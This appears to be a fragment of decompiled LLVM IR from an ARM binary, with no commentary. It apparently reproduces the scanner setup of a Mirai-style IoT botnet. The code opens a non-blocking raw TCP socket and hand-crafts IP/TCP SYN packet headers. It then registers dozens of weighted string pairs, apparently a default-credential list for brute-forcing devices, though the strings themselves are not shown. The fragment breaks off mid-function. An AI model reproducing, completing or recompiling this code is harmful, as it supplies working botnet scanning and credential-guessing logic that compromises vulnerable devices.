  store i32 %v0_10030, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2290c.90 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_10030, i32* @global_var_2290c.90, align 4
  %v1_1003c = call i32 @function_f5cc(i32 %v0_10030)
  %v0_10040 = load i32, i32* @r4, align 4
  store i32 %v0_10040, i32* %r0.global-to-local, align 4
  %v1_10044 = inttoptr i32 %v0_10040 to i32*
  %v2_10044 = call i32 @function_15ad0(i32* %v1_10044)
  store i32 ptrtoint (i32* @global_var_22398.194 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_10044, i32* @global_var_22398.194, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_10058 = call i32 @function_1320c(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_22928.205 to i32), i32* %r3.global-to-local, align 4
  %v0_10060 = load i32, i32* @r4, align 4
  store i32 %v0_10060, i32* %stack_var_-52, align 4
  store i32 %v2_10058, i32* @global_var_22928.205, align 4
  store i32 %v0_10060, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1006c

dec_label_pc_1006c:                               ; preds = %dec_label_pc_1006c.dec_label_pc_1006c_crit_edge, %dec_label_pc_10030
  %v2_10078 = phi i32 [ %v2_10078.pre, %dec_label_pc_1006c.dec_label_pc_1006c_crit_edge ], [ %v2_10058, %dec_label_pc_10030 ]
  %v0_10080 = phi i32 [ %v0_100b0, %dec_label_pc_1006c.dec_label_pc_1006c_crit_edge ], [ %v0_10060, %dec_label_pc_10030 ]
  %v3_10074 = mul i32 %v0_10080, 256
  store i32 %v3_10074, i32* %ip.global-to-local, align 4
  store i32 %v2_10078, i32* @lr, align 4
  %v2_10088 = mul i32 %v0_10080, 288
  %v1_10090 = add i32 %v0_10080, 1
  store i32 %v1_10090, i32* %r0.global-to-local, align 4
  %v2_10094 = add i32 %v2_10088, %v2_10078
  store i32 %v2_10094, i32* %r2.global-to-local, align 4
  store i32 %v2_10094, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_100a8 = add i32 %v2_10094, 4
  %v3_100a8 = inttoptr i32 %v2_100a8 to i32*
  store i32 -1, i32* %v3_100a8, align 4
  %v0_100ac = load i32, i32* @r5, align 4
  %v1_100ac = load i32, i32* %r1.global-to-local, align 4
  %v2_100ac = add i32 %v1_100ac, 12
  %v3_100ac = inttoptr i32 %v2_100ac to i32*
  store i32 %v0_100ac, i32* %v3_100ac, align 4
  %v0_100b0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_100b0, i32* %stack_var_-52, align 4
  %v7_100b4 = icmp sgt i32 %v1_10090, 255
  br i1 %v7_100b4, label %dec_label_pc_100b8, label %dec_label_pc_1006c.dec_label_pc_1006c_crit_edge

dec_label_pc_1006c.dec_label_pc_1006c_crit_edge:  ; preds = %dec_label_pc_1006c
  %v2_10078.pre = load i32, i32* @global_var_22928.205, align 4
  br label %dec_label_pc_1006c

dec_label_pc_100b8:                               ; preds = %dec_label_pc_1006c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_100c4 = call i32 @function_14b54(i32 2, i32 3, i32 6)
  store i32 %v3_100c4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2292c.207 to i32), i32* %r2.global-to-local, align 4
  %v2_100cc = icmp eq i32 %v3_100c4, -1
  store i1 %v2_100cc, i1* %cpsr_c.global-to-local, align 1
  %v7_100cc = icmp eq i32 %v3_100c4, -1
  store i1 %v7_100cc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_100c4, i32* @r4, align 4
  store i32 %v3_100c4, i32* @global_var_2292c.207, align 4
  br i1 %v7_100cc, label %dec_label_pc_109fc, label %dec_label_pc_100dc

dec_label_pc_100dc:                               ; preds = %dec_label_pc_100b8
  store i32 3, i32* %r1.global-to-local, align 4
  %v0_100e0 = load i32, i32* @r5, align 4
  store i32 %v0_100e0, i32* %r2.global-to-local, align 4
  %v3_100e4 = call i32 @function_12f68(i32 %v3_100c4, i32 3, i32 %v0_100e0)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_100ec = or i32 %v3_100e4, 2048
  store i32 %v1_100ec, i32* %r2.global-to-local, align 4
  %v0_100f0 = load i32, i32* @r4, align 4
  store i32 %v0_100f0, i32* %r0.global-to-local, align 4
  %v3_100f4 = call i32 @function_12f68(i32 %v0_100f0, i32 4, i32 %v1_100ec)
  %v2_100fc = load i32, i32* @global_var_2292c.207, align 4
  store i32 %v2_100fc, i32* @r0, align 4
  store i32 1, i32* %ip.global-to-local, align 4
  %v0_10108 = load i32, i32* @r5, align 4
  store i32 %v0_10108, i32* %r1.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v2_10110 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_10110, i32* %r3.global-to-local, align 4
  store i32 4, i32* @r4, align 4
  store i32 1, i32* %stack_var_-52, align 4
  %v5_10120 = call i32 @function_14ae4(i32 %v2_100fc, i32 %v0_10108, i32 3, i32 %v2_10110, i32 4)
  store i32 %v5_10120, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10124 = icmp eq i32 %v5_10120, 0
  store i1 %v2_10124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10124, label %dec_label_pc_1012c, label %dec_label_pc_109f0

dec_label_pc_1012c:                               ; preds = %dec_label_pc_100dc, %dec_label_pc_1012c
  %v0_1012c = call i32 @function_f570()
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_10134 = urem i32 %v0_1012c, 65536
  %v4_10134 = trunc i32 %v0_1012c to i16
  store i32 %v3_10134, i32* %r0.global-to-local, align 4
  %v2_1013c = call i32 @function_149f4(i32 %v0_1012c)
  store i32 %v2_1013c, i32* %r0.global-to-local, align 4
  %v2_10140 = icmp ugt i32 %v2_1013c, 1023
  store i1 %v2_10140, i1* %cpsr_c.global-to-local, align 1
  %v7_10140 = icmp eq i32 %v2_1013c, 1024
  store i1 %v7_10140, i1* %cpsr_z.global-to-local, align 1
  %v3_10144 = icmp ult i32 %v2_1013c, 1022
  br i1 %v3_10144, label %dec_label_pc_1012c, label %dec_label_pc_10148

dec_label_pc_10148:                               ; preds = %dec_label_pc_1012c
  %v2_1014c = load i8, i8* bitcast (i8** @global_var_22368.209 to i8*), align 4
  %v3_1014c = zext i8 %v2_1014c to i32
  %v1_10150 = and i32 %v3_1014c, 240
  %v1_10154 = or i32 %v1_10150, 5
  store i32 %v1_10154, i32* %r3.global-to-local, align 4
  store i32 69, i32* %r2.global-to-local, align 4
  store i8 69, i8* bitcast (i8** @global_var_22368.209 to i8*), align 4
  store i32 40, i32* %r0.global-to-local, align 4
  %v1_10170 = call i32 @function_1484c(i32 40)
  %v2_10170 = trunc i32 %v1_10170 to i16
  store i32 %v1_10170, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22368.209 to i32), i32* %r1.global-to-local, align 4
  store i16 %v2_10170, i16* bitcast (i32* @global_var_2236a.210 to i16*), align 4
  %v0_1017c = call i32 @function_f570()
  %v1_1017c = trunc i32 %v0_1017c to i16
  store i32 ptrtoint (i8** @global_var_22368.209 to i32), i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r4, align 4
  store i16 %v1_1017c, i16* bitcast (i32* @global_var_2236c.211 to i16*), align 4
  store i8 64, i8* bitcast (i32* @global_var_22370.212 to i8*), align 4
  store i8 6, i8* bitcast (i32* @global_var_22371.213 to i8*), align 4
  store i32 23, i32* %r0.global-to-local, align 4
  %v1_1019c = call i32 @function_1484c(i32 23)
  %v2_1019c = trunc i32 %v1_1019c to i16
  store i32 ptrtoint (i32* @global_var_2237c.215 to i32), i32* %ip.global-to-local, align 4
  %v3_101a4 = load i8, i8* @global_var_22388.216, align 1
  %tmp = urem i8 %v3_101a4, 16
  %v1_101a8 = zext i8 %tmp to i32
  %v1_101ac = or i32 %v1_101a8, 80
  store i32 %v1_101ac, i32* %r3.global-to-local, align 4
  %v1_101b0 = trunc i32 %v1_101ac to i8
  store i8 %v1_101b0, i8* @global_var_22388.216, align 1
  store i32 ptrtoint (i8** @global_var_22368.209 to i32), i32* @lr, align 4
  store i16 %v2_1019c, i16* @global_var_2237e.217, align 2
  store i32 %v0_1012c, i32* %r0.global-to-local, align 4
  store i16 %v4_10134, i16* bitcast (i32* @global_var_2237c.215 to i16*), align 4
  %v0_101c4 = call i32 @function_f570()
  %v1_101c4 = trunc i32 %v0_101c4 to i16
  %v3_101cc = load i8, i8* @global_var_22389.218, align 1
  %v4_101cc = zext i8 %v3_101cc to i32
  store i32 ptrtoint (i32* @global_var_2237c.215 to i32), i32* %ip.global-to-local, align 4
  %v1_101d4 = or i32 %v4_101cc, 2
  store i32 %v1_101d4, i32* %r3.global-to-local, align 4
  store i16 %v1_101c4, i16* bitcast (i32* @global_var_2238a.219 to i16*), align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_101e0 = trunc i32 %v1_101d4 to i8
  store i8 %v1_101e0, i8* @global_var_22389.218, align 1
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19868.223 to i32), i32* %r1.global-to-local, align 4
  %v4_101ec = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_19868.223 to i32), i32 10)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19870.225 to i32), i32* %r1.global-to-local, align 4
  store i32 9, i32* %r2.global-to-local, align 4
  %v5_101fc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([6 x i8]* @global_var_19870.225 to i32), i32 9)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v5_1020c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 8)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r1.global-to-local, align 4
  %v5_1021c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 7)
  %v0_10220 = load i32, i32* @r4, align 4
  store i32 %v0_10220, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19880.229 to i32), i32* %r1.global-to-local, align 4
  %v4_1022c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_19880.229 to i32), i32 %v0_10220)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19888.231 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_1023c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([8 x i8]* @global_var_19888.231 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19890.233 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_1024c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([8 x i8]* @global_var_19890.233 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_19898.235 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v5_1025c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([9 x i8]* @global_var_19898.235 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198a4.237 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1026c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_198a4.237 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198ac.239 to i32), i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  %v4_1027c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_198ac.239 to i32), i32 5)
  store i32 ptrtoint ([8 x i8]* @global_var_198b4.241 to i32), i32* %r0.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_198b4.241 to i32), i32* %r1.global-to-local, align 4
  %v5_1028c = call i32 @function_fe88(i32 ptrtoint ([8 x i8]* @global_var_198b4.241 to i32), i32 ptrtoint ([8 x i8]* @global_var_198b4.241 to i32), i32 5)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1979c.243 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_1029c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_1979c.243 to i32), i32 4)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_198bc.245 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_102ac = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint ([9 x i8]* @global_var_198bc.245 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r1.global-to-local, align 4
  %v5_102bc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198c8.247 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v4_102cc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_198c8.247 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_198d0.249 to i32), i32* %r0.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_198d0.249 to i32), i32* %r1.global-to-local, align 4
  %v5_102dc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_198d0.249 to i32), i32 ptrtoint ([5 x i8]* @global_var_198d0.249 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1979c.243 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_102ec = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_1979c.243 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_198d8.251 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_102fc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([5 x i8]* @global_var_198d8.251 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198e0.253 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_1030c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_198e0.253 to i32), i32 3)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198ec.255 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v4_1031c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_198ec.255 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_198f4.257 to i32), i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_1032c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint ([9 x i8]* @global_var_198f4.257 to i32), i32 3)
  store i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198ec.255 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_1033c = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19878.227 to i32), i32 ptrtoint (i32* @global_var_198ec.255 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19900.259 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_1034c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_19900.259 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_198bc.245 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_1035c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([9 x i8]* @global_var_198bc.245 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19908.261 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_1036c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_19908.261 to i32), i32 2)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19910.263 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1037c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_19910.263 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_19918.265 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_19928.267 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1038c = call i32 @function_fe88(i32 ptrtoint ([14 x i8]* @global_var_19918.265 to i32), i32 ptrtoint ([7 x i8]* @global_var_19928.267 to i32), i32 1)
  store i32 ptrtoint ([8 x i8]* @global_var_19930.269 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_19930.269 to i32), i32* %r1.global-to-local, align 4
  %v5_1039c = call i32 @function_fe88(i32 ptrtoint ([8 x i8]* @global_var_19930.269 to i32), i32 ptrtoint ([8 x i8]* @global_var_19930.269 to i32), i32 1)
  store i32 ptrtoint ([11 x i8]* @global_var_19938.271 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_19938.271 to i32), i32* %r1.global-to-local, align 4
  %v5_103ac = call i32 @function_fe88(i32 ptrtoint ([11 x i8]* @global_var_19938.271 to i32), i32 ptrtoint ([11 x i8]* @global_var_19938.271 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19944.273 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19944.273 to i32), i32* %r1.global-to-local, align 4
  %v5_103bc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19944.273 to i32), i32 ptrtoint ([6 x i8]* @global_var_19944.273 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19944.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198c8.247 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_103cc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19944.273 to i32), i32 ptrtoint (i32* @global_var_198c8.247 to i32), i32 1)
  store i32 ptrtoint ([6 x i8]* @global_var_19944.273 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_198c8.247 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_103dc = call i32 @function_fe88(i32 ptrtoint ([6 x i8]* @global_var_19944.273 to i32), i32 ptrtoint (i32* @global_var_198c8.247 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_1994c.275 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_198bc.245 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_103ec = call i32 @function_fe88(i32 ptrtoint (i32* @global_var_1994c.275 to i32), i32 ptrtoint ([9 x i8]* @global_var_198bc.245 to i32), i32 1)
  store i32 ptrtoint ([14 x i8]* @global_var_19954.277 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19908.261 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_103fc = call i32 @function_fe88(i32 ptrtoint ([14 x i8]* @global_var_19954.277 to i32), i32 ptrtoint (i32* @global_var_19908.261 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_19900.259 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19900.259 to i32), i32* %r1.global-to-local, align 4
  %v3_1040c = call i32 @function_fe88(i32 ptrtoint (i32* @global_var_19900.259 to i32), i32 ptrtoint (i32* @global_var_19900.259 to i32), i32 1)
  store i32 ptrtoint (i32* @global_var_19880.229 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19880.229 to i32), i32* %r1.global-to-local, align 4
  %v3_1041c = call i32 @function_fe88(i32 ptrtoint (i32* @global_var_19880.229 to i32), i32 ptrtoint (i32* @global_var_19880.229 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19964.279 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19964.279 to i32), i32* %r1.global-to-local, align 4
  %v5_1042c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19964.279 to i32), i32 ptrtoint ([5 x i8]* @global_var_19964.279 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1996c.281 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1043c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_1996c.281 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19974.283 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1044c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_19974.283 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1997c.285 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1045c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_1997c.285 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19984.287 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1046c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([6 x i8]* @global_var_19984.287 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1998c.289 to i32), i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_1047c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([5 x i8]* @global_var_1998c.289 to i32), i32 4)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_19994.291 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_1048c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([6 x i8]* @global_var_19994.291 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1999c.293 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_1049c = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_1999c.293 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_199ac.295 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_104ac = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint (i32* @global_var_199ac.295 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_199bc.297 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_104bc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([7 x i8]* @global_var_199bc.297 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_199c4.299 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_104cc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([5 x i8]* @global_var_199c4.299 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_199cc.301 to i32), i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_104dc = call i32 @function_fe88(i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32 ptrtoint ([9 x i8]* @global_var_199cc.301 to i32), i32 1)
  store i32 ptrtoint ([5 x i8]* @global_var_19860.221 to i32), i32* %r0.global-to-local, align 4
